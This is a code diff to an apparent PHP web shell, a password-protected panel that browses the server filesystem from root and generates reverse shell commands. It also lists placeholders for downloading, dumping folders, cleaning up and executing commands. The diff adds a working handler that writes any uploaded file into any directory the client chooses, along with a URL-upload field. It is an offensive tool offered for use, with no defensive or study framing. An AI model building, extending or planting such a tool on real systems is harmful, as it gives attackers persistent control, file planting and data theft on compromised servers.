@@ -1,4 +1,5 @@
 <?php
+ob_start();
 
 // ?   PROTECTED LOGIN START
 $MASTER_PASSWORD = 'yourStrongMasterPasswordHere';
@@ -290,7 +291,33 @@ function listDirectory($path) {
     }
     echo '</ul>';
 }
-// SPROTI LS-as NE VSE NA ENKRAT. KLIKNES NA DIRECTORY PA TI ZLISTA TSTO KAR HOCES. FILES AND DIRECTORIES
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && isset($_POST['uploadPath'])) {
+    header('Content-Type: application/json');
+
+    $uploadPath = realpath($_POST['uploadPath']);
+    if (!$uploadPath || !is_dir($uploadPath)) {
+        echo json_encode(['success' => false, 'error' => 'Invalid upload path']);
+        exit;
+    }
+
+    $uploadFile = $_FILES['uploadFile'];
+
+    if ($uploadFile['error'] !== UPLOAD_ERR_OK) {
+        echo json_encode(['success' => false, 'error' => 'Upload error code: ' . $uploadFile['error']]);
+        exit;
+    }
+
+    $filename = basename($uploadFile['name']);
+    $destination = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
+
+    if (move_uploaded_file($uploadFile['tmp_name'], $destination)) {
+        echo json_encode(['success' => true]);
+    } else {
+        echo json_encode(['success' => false, 'error' => 'Failed to move uploaded file']);
+    }
+    exit;
+}
 
 
 // ! FUNCTIONS STOP
@@ -390,15 +417,19 @@ $services = [
             border: 1px solid #333;
             border-radius: 10px;
             max-height: 50vh;
+            margin-top: 5px;
+            margin-bottom: 5px;
         }
         input, select, textarea, button, a, .services {
             width: 100%;
-            margin-bottom: 10px;
             background: #222;
             color: #0f0;
             border: 1px solid #444;
             padding: 8px;
             box-sizing: border-box;
+        }
+        input[type="file"]{
+            width: 200px !important;
         }
         .btn {
             background: #333;
@@ -443,6 +474,12 @@ $services = [
             align-items: center;
             gap: 15px;
         }
+        .flex-column{
+            display: inline-flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 15px;
+        }
 
         .error {
             color: red;
@@ -483,6 +520,7 @@ $services = [
             overflow: auto;
             white-space: nowrap;
             flex: 1;
+            margin: 0px;
         }
         ul {
             list-style-type: none;
@@ -530,8 +568,8 @@ $services = [
     <div class="grid">
         <div class="card">
             <!-- Services, Auto Revshell Generator -->
-            <h2>Services</h2>
-            <div class="flex-row">
+            <div class="card flex-row">
+                <h3>Services</h3>
                 <?php
                 foreach ($services as $name => $service) {
                     $is_disabled = isset($service['status']) && $service['status'] === 'NO';
@@ -553,26 +591,36 @@ $services = [
                 ?>
             </div>
             <div class="card">
+                <h3>Reverse Shell</h3>
                 <div class="flex-row">
                     <input id="revshell_ip" type="text" placeholder="IP:">
                     <input id="revshell_port" type="text" placeholder="PORT:">
                 </div>
-                <pre class="card" id="revshell" style="white-space:pre-wrap"></pre>
+                <pre class="card" id="revshell" style="white-space:pre-wrap">Generate revshell by clicking on Services</pre>
             </div>
         </div>
         <div id="file-tree-container" class="card span-row">
-            <input type="hidden" id="selectedPath" name="selectedPath">
+            <input type="hidden" id="selectedPath" name="selectedPath" value="/">
+            <h3>Folders And Files</h3>
             <ul id="file-tree">
                 <?php listDirectory('/'); ?>
             </ul>   
         </div>
         <div class="card">
-            <div class="flex-row">
-                <button class="btn">Clean&nbsp;Up</button>
-                <button class="btn">Upload</button>
-                <button class="btn">URL&nbsp;Upload</button>
+            <div class="flex-column">
+                <div class="flex-row">
+                    <label for="uploadFileInput">Upload&nbsp;File:</label>
+                    <input id="uploadFileInput" name="uploadFile" type="file">
+                </div>
+                <div class="flex-row">
+                    <label for="urlUpload">URL&nbsp;Upload:</label>
+                    <input id="urlUpload" type="text" placeholder="URL:">
+                    <input id="urlUploadName" type="text" placeholder="File Name:">
+                    <input id="urlUploadSubmit" class="btn" type="button" value="Submit">
+                </div>
                 <button class="btn">Download</button>
                 <button class="btn">Dump&nbsp;Folder</button>
+                <button class="btn">Clean&nbsp;Up</button>
             </div>
         </div>
         <div class="card span-column">Execute, Command History</div>
@@ -582,34 +630,77 @@ $services = [
 </body>
 
 <script>
-let selectedDir = '';
-
-document.addEventListener('click', function (e) {
-  if (e.target.classList.contains('folder')) {
-    const el = e.target;
-    const path = el.getAttribute('data-path');
-    const parent = el.parentElement;
-
-    // Deselect previous
-    document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
-    el.classList.add('selected');
-    selectedDir = path;
-    document.getElementById('selectedPath').value = path;
-
-    // Toggle display
-    parent.classList.toggle('open');
-
-    // Only fetch if it's empty
-    const nested = el.nextElementSibling;
-    if (!nested.hasChildNodes()) {
-      fetch('?path=' + encodeURIComponent(path))
-        .then(response => response.text())
-        .then(html => {
-          nested.innerHTML = html;
-        });
+    function refreshFolder(path, targetElement) {
+        fetch('?path=' + encodeURIComponent(path))
+            .then(response => response.text())
+            .then(html => {
+                targetElement.innerHTML = html;
+            });
     }
-  }
-});
+</script>
+
+<script>
+    document.getElementById('uploadFileInput').addEventListener('change', function() {
+        const fileInput = document.getElementById('uploadFileInput');
+        const file = fileInput.files[0];
+        if (!file) return;
+
+        const selectedPath = document.getElementById('selectedPath').value || '/';
+
+        const formData = new FormData();
+        formData.append('uploadFile', file);
+        formData.append('uploadPath', selectedPath);
+
+        fetch(window.location.pathname, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                alert('Upload successful!');
+                fileInput.value = '';
+
+                // Find the currently selected folder and its nested <ul> to refresh
+                const selectedFolder = document.querySelector('.folder.selected');
+                if (selectedFolder) {
+                    const nested = selectedFolder.nextElementSibling;
+                    if (nested) {
+                        refreshFolder(selectedPath, nested);
+                    }
+                }
+            } else {
+                alert('Upload error: ' + data.error);
+            }
+        })
+        .catch(err => {
+            alert('Upload failed: ' + err.message);
+        });
+    });
+</script>
+
+<script>
+    document.getElementById('file-tree').addEventListener('click', function (e) {
+        if (e.target.classList.contains('folder')) {
+            const el = e.target;
+            const path = el.getAttribute('data-path');
+            const parent = el.parentElement;
+
+            // Deselect previous
+            document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedDir = path;
+            document.getElementById('selectedPath').value = path;
+
+            // Toggle display
+            parent.classList.toggle('open');
+
+            const nested = el.nextElementSibling;
+
+            // Refresh folder view
+            refreshFolder(path, nested);
+        }
+    });
 </script>
 
 <script>
